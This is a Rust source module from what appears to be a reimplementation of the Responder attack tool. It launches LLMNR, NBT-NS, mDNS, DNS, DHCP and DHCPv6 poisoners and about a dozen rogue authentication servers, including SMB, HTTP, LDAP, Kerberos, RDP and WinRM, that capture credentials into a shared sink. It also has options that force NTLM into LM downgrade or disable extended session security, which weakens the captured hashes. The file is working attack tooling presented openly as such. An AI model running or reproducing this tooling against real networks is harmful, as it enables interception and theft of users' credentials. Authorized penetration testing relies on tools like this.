//! Rogue authentication servers. Each server is a tokio task that binds its default port(s)
//! and captures credentials through the shared [`CaptureSink`].

pub mod dcerpc;
pub mod ftp;
pub mod http;
pub mod imap;
pub mod kerberos;
pub mod ldap;
pub mod mssql;
pub mod pop3;
pub mod rdp;
pub mod smb;
pub mod smtp;
pub mod winrm;

use std::net::{Ipv4Addr, SocketAddr};
use std::sync::Arc;

use anyhow::Result;

use crate::capture::CaptureSink;
use crate::capture::model::RunConfiguration;
use crate::constants::{CAPTURE_CHALLENGE_HEX, Service};
use crate::logger::Logger;
use crate::protocols::ntlm;
use crate::util;

use tokio::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};

/// Read a single CRLF/LF-terminated line (without the terminator) from an async stream.
pub async fn read_line<S: AsyncRead + Unpin>(stream: &mut S) -> Option<String> {
    let mut buf = Vec::new();
    let mut b = [0u8; 1];
    loop {
        match stream.read(&mut b).await {
            Ok(0) | Err(_) => return None,
            Ok(_) => {}
        }
        if b[0] == b'\n' {
            break;
        }
        if b[0] != b'\r' {
            buf.push(b[0]);
        }
        if buf.len() > 1 << 16 {
            return None;
        }
    }
    Some(String::from_utf8_lossy(&buf).to_string())
}

/// Write raw text to an async stream.
pub async fn write_str<S: AsyncWrite + Unpin>(stream: &mut S, text: &str) -> std::io::Result<()> {
    stream.write_all(text.as_bytes()).await?;
    stream.flush().await
}

/// Shared state handed to every rogue server.
pub struct ServerContext {
    pub cfg: RunConfiguration,
    pub sink: CaptureSink,
    pub logger: Arc<Logger>,
    pub server_guid: [u8; 16],
    pub local_ip: Ipv4Addr,
}

impl ServerContext {
    pub fn new(
        cfg: RunConfiguration,
        sink: CaptureSink,
        logger: Arc<Logger>,
        local_ip: Ipv4Addr,
    ) -> Self {
        ServerContext {
            cfg,
            sink,
            logger,
            server_guid: random_bytes(16).try_into().unwrap(),
            local_ip,
        }
    }

    /// NetBIOS/computer name claimed in NTLM challenges.
    pub fn netbios(&self) -> String {
        self.cfg
            .answer_name
            .clone()
            .unwrap_or_else(|| "RESPONDER".to_string())
    }

    /// The per-service server challenge, if overridden, else the default capture challenge.
    pub fn challenge_for(&self, service: Service) -> [u8; 8] {
        let hex = self
            .cfg
            .service(service)
            .and_then(|s| s.challenge.clone())
            .filter(|c| !c.eq_ignore_ascii_case("random"))
            .unwrap_or_else(|| CAPTURE_CHALLENGE_HEX.to_string());
        let mut c = ntlm::capture_challenge();
        if let Some(bytes) = util::unhex(&hex)
            && bytes.len() == 8
        {
            c.copy_from_slice(&bytes);
        }
        c
    }

    /// Build an NTLM Type-2 challenge honouring `--lm`/`--disable-ess` for `service`.
    pub fn build_challenge(&self, service: Service) -> Vec<u8> {
        ntlm::build_challenge(
            &self.challenge_for(service),
            &self.netbios(),
            self.cfg.lm_downgrade,
            self.cfg.disable_ess,
        )
    }
}

/// Result of attempting to bind a service.
#[derive(Clone, Debug)]
pub struct BindOutcome {
    pub service: Service,
    pub ok: bool,
    pub error: Option<String>,
}

/// Random bytes helper used for GUIDs and tokens.
pub fn random_bytes(n: usize) -> Vec<u8> {
    let mut v = vec![0u8; n];
    rand::fill(&mut v);
    v
}

/// Try to bind a TCP listener, capturing the OS error text for the startup summary.
pub async fn try_bind(addr: SocketAddr) -> Result<tokio::net::TcpListener, String> {
    tokio::net::TcpListener::bind(addr)
        .await
        .map_err(|e| e.to_string())
}

/// A privileged-port hint shown when a bind fails with permission denied.
pub fn privilege_hint(port: u16) -> String {
    format!(
        "binding port {port} failed; privileged ports require root/CAP_NET_BIND_SERVICE \
         (setcap 'cap_net_bind_service=+ep' $(which responder))"
    )
}

fn ctx_poison_config(ctx: &ServerContext) -> crate::poisoners::PoisonConfig {
    crate::poisoners::PoisonConfig {
        answer_ipv4: ctx.local_ip,
        answer_ipv6: ctx.cfg.external_ipv6,
        ttl: ctx.cfg.ttl,
        answer_name: ctx.cfg.answer_name.clone(),
        analyze: ctx.cfg.analyze,
        domains: ctx.cfg.dns_domains.clone(),
    }
}

/// Spawn every enabled server/poisoner and return per-service bind outcomes.
pub async fn spawn_all(ctx: Arc<ServerContext>) -> Vec<BindOutcome> {
    let mut outcomes = Vec::new();
    let local = ctx.local_ip;

    // --- Poisoners (bind failures are logged inside their run loops) ---------
    if ctx.cfg.is_enabled(Service::Llmnr) {
        let c = ctx.clone();
        let bind = SocketAddr::from((Ipv4Addr::UNSPECIFIED, crate::constants::LLMNR_PORT));
        let iface = local;
        tokio::spawn(async move {
            let cfg = Arc::new(ctx_poison_config(&c));
            if let Err(e) =
                crate::poisoners::llmnr::run(bind, iface, cfg, c.sink.clone(), c.logger.clone())
                    .await
            {
                c.logger.warn(&format!("LLMNR poisoner stopped: {e}"));
            }
        });
        outcomes.push(ok(Service::Llmnr));
    }
    if ctx.cfg.is_enabled(Service::NbtNs) {
        let c = ctx.clone();
        tokio::spawn(async move {
            let bind = SocketAddr::from((Ipv4Addr::UNSPECIFIED, crate::constants::NBTNS_PORT));
            let cfg = Arc::new(ctx_poison_config(&c));
            if let Err(e) =
                crate::poisoners::nbtns::run(bind, cfg, c.sink.clone(), c.logger.clone()).await
            {
                c.logger.warn(&format!("NBT-NS poisoner stopped: {e}"));
            }
        });
        outcomes.push(ok(Service::NbtNs));
    }
    if ctx.cfg.is_enabled(Service::Mdns) {
        let c = ctx.clone();
        tokio::spawn(async move {
            let cfg = Arc::new(ctx_poison_config(&c));
            if let Err(e) =
                crate::poisoners::mdns::run(local, cfg, c.sink.clone(), c.logger.clone()).await
            {
                c.logger.warn(&format!("MDNS poisoner stopped: {e}"));
            }
        });
        outcomes.push(ok(Service::Mdns));
    }
    if ctx.cfg.is_enabled(Service::Dns) {
        let c = ctx.clone();
        tokio::spawn(async move {
            let cfg = Arc::new(ctx_poison_config(&c));
            if let Err(e) =
                crate::poisoners::dns::run(local, cfg, c.sink.clone(), c.logger.clone(), true).await
            {
                c.logger.warn(&format!("DNS server stopped: {e}"));
            }
        });
        outcomes.push(ok(Service::Dns));
    }
    if ctx.cfg.is_enabled(Service::Dhcp) {
        let c = ctx.clone();
        tokio::spawn(async move {
            let cfg = Arc::new(ctx_poison_config(&c));
            if let Err(e) =
                crate::poisoners::dhcp::run(cfg, c.cfg.wpad, c.sink.clone(), c.logger.clone()).await
            {
                c.logger.warn(&format!("DHCP server stopped: {e}"));
            }
        });
        outcomes.push(ok(Service::Dhcp));
    }
    if ctx.cfg.is_enabled(Service::Dhcpv6) {
        let c = ctx.clone();
        tokio::spawn(async move {
            let cfg = Arc::new(ctx_poison_config(&c));
            // Bind on the wildcard address; the address advertised as DNS is `external_ipv6`.
            let bind = std::net::Ipv6Addr::UNSPECIFIED;
            if let Err(e) =
                crate::poisoners::dhcpv6::run(bind, cfg, c.sink.clone(), c.logger.clone()).await
            {
                c.logger.warn(&format!("DHCPv6 server stopped: {e}"));
            }
        });
        outcomes.push(ok(Service::Dhcpv6));
    }

    // --- Rogue auth servers --------------------------------------------------
    if ctx.cfg.is_enabled(Service::Smb) {
        let mut bound = false;
        let mut err = None;
        for port in [445, 139] {
            match try_bind(SocketAddr::from((local, port))).await {
                Ok(l) => {
                    ctx.logger.info(&format!("SMB listening on {local}:{port}"));
                    bound = true;
                    tokio::spawn(smb::serve(l, ctx.clone()));
                }
                Err(e) => err = Some(format!("{e} — {}", privilege_hint(port))),
            }
        }
        outcomes.push(BindOutcome {
            service: Service::Smb,
            ok: bound,
            error: if bound { None } else { err },
        });
    }
    if ctx.cfg.is_enabled(Service::Http) || ctx.cfg.is_enabled(Service::Wpad) {
        outcomes.push(server(Service::Http, local, 80, ctx.clone(), http::serve_plain).await);
    }
    if ctx.cfg.is_enabled(Service::Https) {
        outcomes.push(server(Service::Https, local, 443, ctx.clone(), http::serve_tls).await);
    }
    if ctx.cfg.is_enabled(Service::Ftp) {
        outcomes.push(server(Service::Ftp, local, 21, ctx.clone(), ftp::serve).await);
    }
    if ctx.cfg.is_enabled(Service::Pop3) {
        outcomes.push(server(Service::Pop3, local, 110, ctx.clone(), pop3::serve).await);
    }
    if ctx.cfg.is_enabled(Service::Smtp) {
        outcomes.push(
            server(Service::Smtp, local, 25, ctx.clone(), |l, c| {
                smtp::serve(l, c, false)
            })
            .await,
        );
    }
    if ctx.cfg.is_enabled(Service::Imap) {
        outcomes.push(
            server(Service::Imap, local, 143, ctx.clone(), |l, c| {
                imap::serve(l, c, false)
            })
            .await,
        );
    }
    if ctx.cfg.is_enabled(Service::Imaps) {
        outcomes.push(
            server(Service::Imaps, local, 993, ctx.clone(), |l, c| {
                imap::serve(l, c, true)
            })
            .await,
        );
    }
    if ctx.cfg.is_enabled(Service::Mssql) {
        outcomes.push(server(Service::Mssql, local, 1433, ctx.clone(), mssql::serve).await);
    }
    if ctx.cfg.is_enabled(Service::Ldap) {
        outcomes.push(
            server(Service::Ldap, local, 389, ctx.clone(), |l, c| {
                ldap::serve(l, c, false)
            })
            .await,
        );
    }
    if ctx.cfg.is_enabled(Service::Ldaps) {
        outcomes.push(
            server(Service::Ldaps, local, 636, ctx.clone(), |l, c| {
                ldap::serve(l, c, true)
            })
            .await,
        );
    }
    if ctx.cfg.is_enabled(Service::Kerberos) {
        outcomes.push(server(Service::Kerberos, local, 88, ctx.clone(), kerberos::serve).await);
    }
    if ctx.cfg.is_enabled(Service::Rdp) {
        outcomes.push(server(Service::Rdp, local, 3389, ctx.clone(), rdp::serve).await);
    }
    if ctx.cfg.is_enabled(Service::Winrm) {
        outcomes.push(
            server(Service::Winrm, local, 5985, ctx.clone(), |l, c| {
                winrm::serve(l, c, false)
            })
            .await,
        );
    }
    if ctx.cfg.is_enabled(Service::Winrms) {
        outcomes.push(
            server(Service::Winrms, local, 5986, ctx.clone(), |l, c| {
                winrm::serve(l, c, true)
            })
            .await,
        );
    }
    if ctx.cfg.is_enabled(Service::Dcerpc) {
        outcomes.push(server(Service::Dcerpc, local, 135, ctx.clone(), dcerpc::serve).await);
    }

    outcomes
}

fn ok(service: Service) -> BindOutcome {
    BindOutcome {
        service,
        ok: true,
        error: None,
    }
}

async fn server<F, Fut>(
    service: Service,
    ip: Ipv4Addr,
    port: u16,
    ctx: Arc<ServerContext>,
    make: F,
) -> BindOutcome
where
    F: FnOnce(tokio::net::TcpListener, Arc<ServerContext>) -> Fut + Send + 'static,
    Fut: std::future::Future<Output = Result<()>> + Send + 'static,
{
    match try_bind(SocketAddr::from((ip, port))).await {
        Ok(listener) => {
            ctx.logger
                .info(&format!("{} listening on {ip}:{port}", service.as_str()));
            tokio::spawn(make(listener, ctx));
            ok(service)
        }
        Err(e) => BindOutcome {
            service,
            ok: false,
            error: Some(format!("{e} — {}", privilege_hint(port))),
        },
    }
}
